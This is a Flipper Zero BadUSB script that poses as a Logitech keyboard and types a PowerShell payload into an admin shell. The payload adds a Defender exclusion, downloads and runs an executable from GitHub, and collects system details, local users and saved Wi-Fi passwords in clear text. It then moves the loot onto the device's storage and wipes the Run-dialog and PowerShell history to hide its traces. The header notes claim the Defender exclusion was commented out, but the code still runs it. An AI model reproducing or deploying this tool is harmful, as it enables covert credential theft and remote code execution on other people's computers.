//NOTES: Increased delay times and commented out "Add-MpPreference -ExclusionPath $currentDirectory.Path;",    In order to avoid an error that was popping up due to not running as ADMIN - 07/3/2024 - 1349hrs.
//Also removed /*Remove-MpPreference -ExclusionPath $currentDirectory.Path;*/ SUCCESS! - 07/3/2024 - 1349hrs.


// Requirements
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

// Mass storage details
let image = "/ext/apps_data/mass_storage/All_in_One.img";
let size = 8 * 1024 * 1024;

// PowerShell script
let script = [
    "$currentDirectory = Get-Location;",
    "Add-MpPreference -ExclusionPath $currentDirectory.Path;",
    "$Date = Get-Date -Format yyyy-MM-dd;",//Get Date
    "$Time = Get-Date -Format hh-mm-ss;",//Get Time
    "$exeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/edge/edge.exe';", // URL of the executable
    "$exePath = '.\\edge.exe';", // Path where the executable will be saved in the current directory
    "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}", // Download the executable if it doesn't exist
    "$commandOutput = & \"$exePath\" | Out-String;", // Execute the command and capture the output
    "$fileName = '.\\stats.txt -Append';", //Output filename
    "$commandOutput | Out-File -FilePath $fileName;", // Save the output to a file

 // Collect system information
    "Get-CimInstance -ClassName Win32_ComputerSystem >> stats.txt;", // Listing computer manufacturer and model
    "Get-LocalUser >> stats.txt;", // List users on the system
    "Get-LocalUser | Where-Object -Property PasswordRequired -Match false >> stats.txt;", // Which users have password required set to false
    "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct >> stats.txt;", // List which AntiVirus Product is being used
    "Get-CimInstance -ClassName Win32_QuickFixEngineering >> stats.txt;", // Listing installed hotfixes
    "(netsh wlan show profiles) | Select-String ':(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;", // Get network profiles with passwords
    "dir env: >> stats.txt;", // Check ENV
    "Get-ComputerInfo >> stats.txt;", // Computer Info
    "Get-Service >> stats.txt;", // Get running services
    "Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\\d+.\\d+)' >> stats.txt;", // Check all IPV4 suffix that is not localhost
    "Get-NetTCPConnection | Select-Object -Property * >> stats.txt;", // Get TCP information, ports, state etc.
    "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 >> stats.txt;", // Get top 10 processes by CPU usage
    "Get-EventLog -LogName System -Newest 50 >> stats.txt;", // Get the latest 50 system event logs
    "Get-HotFix >> stats.txt;", // List all installed hotfixes
    "Get-Volume >> stats.txt;", // Get volume information
    "Get-Process | Select-Object -Property Name,Id,Path,StartTime,Company,FileVersion >> stats.txt;", // List all running processes with detailed info
];


// Script crawler
let command = "";
for (let i = 0; i < script.length; i++) {
    command += script[i];
}

// Check if mass storage already exists
print("Checking for Image...");
if (storage.exists(image)) {
    print("Storage Exists.");
} else {
    print("Creating Storage...");
    usbdisk.createImage(image, size);
}

// VID & PID as HID
badusb.setup({
    vid: 0xAAAA,
    pid: 0xBBBB,
    mfr_name: "Logitech",
    prod_name: "KeyBoard",
    layout_path: "/ext/badusb/assets/layouts/en-US.kl"
});

print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

badusb.press("GUI", "x"); //Open Run Dialog
delay(300);
badusb.press("a"); //Open as ADMIN
delay(400);
badusb.press("ALT", "y"); // Runs Powershell as Admin
delay(2000);


print("Running payload");
badusb.println(command, 1);//Run Script Crawler
delay(9000);
delay(5000);
delay(5000);
// Added commands below to delete stats.txt after copying to the flipper, then delete the run dialog and PowerShell history for a clean exfil
badusb.println("echo 'Please wait until this Window closes to eject the disk!'; Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\; Move-Item -Path stats.txt -Destination ${DriveLetter}:\\${Date}\\${env:computername}_${Time}.txt; Remove-Item stats.txt; $currentDirectory = Get-Location; Remove-MpPreference -ExclusionPath $currentDirectory.Path; reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; exit");
badusb.quit();
delay(2000);
usbdisk.start(image);//Open MassStorage Folder
print("Please wait until powershell closes to eject");
delay(9000);
delay(9000);
delay(9000);
// Wait for user to eject the mass storage
while (!usbdisk.wasEjected()) {
    delay(1000);
}

// Stop the script
usbdisk.stop();
print("Done");


